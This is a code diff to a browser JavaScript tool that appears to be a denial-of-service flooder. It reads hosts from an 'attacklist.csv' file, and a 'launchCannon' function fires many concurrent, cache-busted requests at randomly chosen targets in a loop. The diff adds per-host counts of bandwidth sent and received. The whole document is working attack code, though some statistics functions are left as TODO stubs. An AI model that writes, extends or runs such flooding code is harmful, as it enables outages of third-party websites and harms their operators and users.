@@ -5,6 +5,7 @@
     btnStart: document.getElementById("btnAction"),
     btnStop: document.getElementById("btnStop"),
     counter: document.getElementById("txtCounter"),
+    stats: document.getElementById("txtStats"),
   };
 
   var counter = {
@@ -13,7 +14,13 @@
   };
 
   var stats = {
-    // TODO
+    bytes: {
+      host: {},
+      total: {
+        upload: 0,
+        download: 0
+      }
+    }
   }
 
   var isActive = false
@@ -22,8 +29,13 @@
     elements.counter.innerHTML = `Launched: <strong>${counter.total}</strong>, Hit: <strong>${counter.hit}</strong>`;
   }
 
+  function refreshStats() {
+    elements.stats.innerHTML = JSON.stringify(stats, null, 2)
+  }
+
   window.getTargets = function (cb) {
     fetch("/attacklist.csv").then((res) => {
+      let id = 0;
       res.text().then((list) => {
         var targets = list
           .split("\n")
@@ -32,6 +44,7 @@
           .map((i) => {
             var row = i.split(",");
             return {
+              key: id++,
               title: row[0],
               method: row[1],
               host: row[2],
@@ -54,11 +67,28 @@
     isActive = false;
   }
 
-  var calcRequestBytes = function (method, uri, body) {
-      return method.length 
+  var calcRequestUploadBytes = function (target, url) {
+      // TODO: factor in TLS?
+      return (target.method || 'GET').length 
         + 1
-        + uri
-        + 'HTTP'
+        + url.length
+        + 5  // http
+        + 300 // headers
+        + (target.body || '').length
+  }
+
+  var calcRequestDownloadBytes = function (res) {
+      return 0 // TODO
+  }
+
+  var updateStats = function (host, type, bytes) {
+    if (!stats.bytes.host[host]) {
+      stats.bytes.host[host] = {upload: 0, download: 0}
+    }
+
+    stats.bytes.host[host][type] += bytes
+    stats.bytes.total[type] += bytes
+    refreshStats();
   }
 
   window.launchCannon = function (bytes, progressCb, done) {
@@ -73,6 +103,7 @@
           var target = targets[Math.floor(Math.random() * targets.length)];
           if (!isActive) { return }
           counter.total++;
+
           var rand = `${Math.floor(Math.random() * 1000000)}-${new Date().getTime()}`;
           refreshCounter();
 
@@ -90,17 +121,25 @@
             setTimeout(() => {
               controller.abort()
             }, timeout)
-          }).finally(function () {
+          })
+          .then(function (res) {
+            updateStats(target.host, 'download', calcRequestDownloadBytes(res))
+          })
+          .finally(function (err) {
             counter.hit++;
             refreshCounter();
             // TODO until done
             fire();
           });
+
+          updateStats(target.host, 'upload', calcRequestUploadBytes(target, url))
         }
+
         for (let i = 0; i <= maxConcurrent; i++) {
           fire()
         }
       }
+
       fireRequests();
     });
   };
